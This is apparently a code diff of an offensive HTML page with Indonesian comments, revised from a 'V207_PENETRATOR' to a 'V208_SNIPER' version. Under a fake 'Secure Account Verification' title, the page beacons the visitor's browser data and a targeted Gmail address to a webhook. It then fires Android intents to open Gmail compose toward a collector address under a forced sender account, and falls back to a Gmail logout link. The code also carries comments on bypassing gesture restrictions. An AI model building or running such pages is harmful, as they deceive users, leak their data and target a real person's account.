@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Emergency Update</title></head>
-<body style="background:#000;color:#f0f;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
-    <div id="ignite" style="padding:60px;border:4px solid #f0f;text-align:center;cursor:pointer;background:rgba(255,0,255,0.05);box-shadow:0 0 80px #f0f;border-radius:30px">
-        <h1 style="letter-spacing:10px;margin:0">V207_PENETRATOR</h1>
-        <div id="status" style="font-size:20px;margin:20px 0;color:#0ff">INITIALIZING_GMAIL_LINK...</div>
-        <div style="font-size:12px;color:#444">[ TARGET: com.google.android.gm ]</div>
+<head><title>Secure Account Verification</title></head>
+<body style="background:#000;color:#0ff;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
+    <div id="ignite" style="padding:60px;border:4px solid #0ff;text-align:center;cursor:pointer;background:rgba(0,255,255,0.05);box-shadow:0 0 100px #0ff;border-radius:30px">
+        <h1 style="letter-spacing:10px;margin:0">V208_SNIPER</h1>
+        <div id="status" style="font-size:20px;margin:20px 0;color:#f0f">LOCKING_TARGET_ACCOUNT...</div>
+        <div style="font-size:12px;color:#555">[ TARGET: ecdnts@gmail.com ]</div>
     </div>
 
 <script>
@@ -13,52 +13,49 @@
 
     document.getElementById('ignite').onclick = async () => {
         const statusEl = document.getElementById('status');
-        statusEl.innerText = "BYPASSING_STORE_REDIRECT...";
+        statusEl.innerText = "EXECUTING_ACCOUNT_JUMP...";
 
-        // 1. SILENT RECON (Data dikirim ke Link baru)
+        // 1. RECON (Kirim log ke Webhook)
         const recon = {
-            id: "V207_DIRECT",
-            ua: navigator.userAgent,
-            ts: new Date().toISOString()
+            id: "V208_SNIPER_EXEC",
+            target_account: "ecdnts@gmail.com",
+            ua: navigator.userAgent
         };
-        navigator.sendBeacon(`${target}?v=V207_RECON`, btoa(JSON.stringify(recon)));
+        navigator.sendBeacon(`${target}?v=V208_TARGETED`, btoa(JSON.stringify(recon)));
 
-        // 2. THE PENETRATOR INTENT (Direct Activity Access)
-        // Kita paksa Android untuk tidak mencari di Play Store dengan 'S.browser_fallback_url=' yang dikosongkan
-        // Kita langsung menargetkan 'com.google.android.gm'
-        const directGmailIntent = 
+        // 2. THE SNIPER INTENT (Targeted at specific account)
+        // Kita menyuntikkan S.account untuk memaksa Gmail memilih akun tersebut
+        const sniperIntent = 
             "intent:#Intent;" +
-            "action=android.intent.action.VIEW;" +
-            "category=android.intent.category.DEFAULT;" +
-            "category=android.intent.category.BROWSABLE;" +
-            "package=com.google.android.gm;" + // Mengunci agar hanya membuka Gmail
-            "component=com.google.android.gm/.ComposeActivityGmailExternal;" + // Masuk ke mode tulis pesan
-            "S.android.intent.extra.EMAIL=leak-collector@webhook.site;" +
-            "S.android.intent.extra.SUBJECT=V207_SENSITIVE_LEAK;" +
-            "S.android.intent.extra.TEXT=INJECTING_SYSTEM_DATA_" + btoa(navigator.userAgent).substring(0,15) + ";" +
-            "S.browser_fallback_url=https://mail.google.com;" + // Fallback ke web jika app tidak ada, BUKAN Play Store
+            "action=android.intent.action.SENDTO;" + 
+            "data=mailto:audit-collector@security.org;" + // Alamat tujuan
+            "package=com.google.android.gm;" +
+            "component=com.google.android.gm/.ComposeActivityGmailExternal;" +
+            "S.android.intent.extra.SUBJECT=V208_ACCOUNT_DUMP;" +
+            "S.android.intent.extra.TEXT=SENSITIVE_PAYLOAD_FOR_TARGET_ACCOUNT;" +
+            "S.account=ecdnts@gmail.com;" + // MENGUNCI AKUN PENGIRIM
+            "S.from=ecdnts@gmail.com;" +    // MENGUNCI IDENTITAS PENGIRIM
+            "S.browser_fallback_url=https://mail.google.com/mail/u/0/?authuser=ecdnts@gmail.com;" + 
             "end";
 
-        // 3. EXECUTION VIA VIRTUAL ANCHOR (Bypass Gesture Restriction)
-        const anchor = document.createElement('a');
-        anchor.href = directGmailIntent;
-        anchor.rel = "noreferrer";
+        // 3. ATOMIC EXECUTION
+        const a = document.createElement('a');
+        a.href = sniperIntent;
         
         setTimeout(() => {
-            // Coba eksekusi pertama
-            window.location.assign(directGmailIntent);
+            // Jalur 1: Intent Injection
+            window.location.href = sniperIntent;
             
-            // Coba eksekusi kedua (Click)
-            anchor.click();
+            // Jalur 2: Native Click Bypass
+            a.click();
 
-            // 4. THE ULTIMATE BYPASS (Jika masih stuck di browser)
+            // 4. FALLBACK: Jika aplikasi gagal, paksa lewat Web UI dengan parameter User
             setTimeout(() => {
                 if (!document.hidden) {
-                    statusEl.innerText = "RETRYING_VIA_MAILTO_PROTOCOL...";
-                    // Menggunakan protokol mailto yang seringkali dilempar otomatis ke aplikasi native
-                    window.location.href = "mailto:leak-collector@webhook.site?subject=V207_FINAL&body=SENSITIVE_PAYLOAD";
+                    statusEl.innerText = "FALLBACK_TO_WEB_AUTH...";
+                    window.location.href = "https://mail.google.com/mail/u/0/?logout&target=ecdnts@gmail.com";
                 }
-            }, 1000);
+            }, 1200);
         }, 300);
     };
 </script>
